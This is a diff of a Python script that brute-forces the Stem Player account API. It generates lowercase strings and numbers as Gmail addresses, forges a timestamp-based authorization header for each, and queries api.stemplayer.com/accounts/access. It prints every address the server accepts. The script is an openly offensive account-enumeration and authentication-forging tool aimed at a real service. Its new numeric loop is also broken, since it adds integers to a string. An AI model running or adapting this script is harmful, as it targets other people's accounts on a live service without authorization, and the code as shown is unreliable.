@@ -4,16 +4,17 @@ import base64
 import string
 import itertools
 
-numberList = list(range(0, 16))
-characterList = list(string.ascii_lowercase)
+range_list = list(range(0, 16))
+character_list = list(string.ascii_lowercase)
+number_list = list(range(0, 99))
 
-def foo(l):
-	for numItem in enumerate(numberList):
-		yield from itertools.product(*([l] * numItem[0])) 
+def generate(l):
+	for num_item in enumerate(range_list):
+		yield from itertools.product(*([l] * num_item[0]))
 
-for x in foo("abcdefghijklmnopqrstuvwxyz"):
+def test(test_email):
 		time.sleep(1)
-		email = ''.join(x) + "@gmail.com"
+		email = test_email + "@gmail.com"
 		timestamp = round(int(time.time()))
 		authorization = email + ':' + str(timestamp)
 		bytes = authorization.encode("utf-8")
@@ -27,3 +28,9 @@ for x in foo("abcdefghijklmnopqrstuvwxyz"):
 		r = requests.get('https://api.stemplayer.com/accounts/access', headers=headers)
 		if r.status_code == 200:
 			print(email)
+
+for x in generate("abcdefghijklmnopqrstuvwxyz"):
+		test(''.join(x))
+
+for x in number_list:
+		test(x)
